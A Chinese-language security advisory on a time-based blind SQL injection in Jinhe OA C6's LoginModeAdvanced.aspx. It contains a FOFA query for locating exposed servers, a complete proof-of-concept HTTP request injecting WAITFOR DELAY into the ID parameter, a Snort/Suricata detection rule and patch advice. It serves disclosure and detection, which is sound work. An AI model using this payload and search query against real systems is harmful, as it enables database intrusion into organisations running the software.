# 金和OA LoginModeAdvanced.aspx 存在SQL注入漏洞

金和OA LoginModeAdvanced.aspx 存在SQL注入漏洞

# 影响版本

**金和OA C6** 系列版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  **app=&quot;金和网络-金和OA&quot;**

**POC/EXP：**

**step1** **延时注入测试**

```
GET /c6/Jhsoft.Web.AddMenu/LoginModeAdvanced.aspx/?ID=1;WAITFOR+DELAY+'0:0:5' HTTP/1.1
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: ASP.NET_SessionId=woqhdwkih2whsz02t3cmubzu
Connection: keep-alive


```

​![image](assets/image-20260901163934-am5qqlq.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"金和OA - /c6/Jhsoft.Web.AddMenu/LoginModeAdvanced.aspx SQL注入漏洞 (Time-based Blind)";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri; content:"/c6/Jhsoft.Web.AddMenu/LoginModeAdvanced.aspx"; fast_pattern;
    http.uri; content:"ID="; nocase;
    http.uri; pcre:"/ID\s*=\s*[^&]*WAITFOR(\+|%20|\s)DELAY/i";
    metadata:
        service http,
        affected_product "金和OA",
        vulnerability_type "SQL Injection (Time-based)",
        severity "critical";
    classtype:web-application-attack;
    sid:1000748;
    rev:1;
    priority:1;
)
```

# 漏洞修复

**尽快升级**：官方已发布安全补丁。

‍
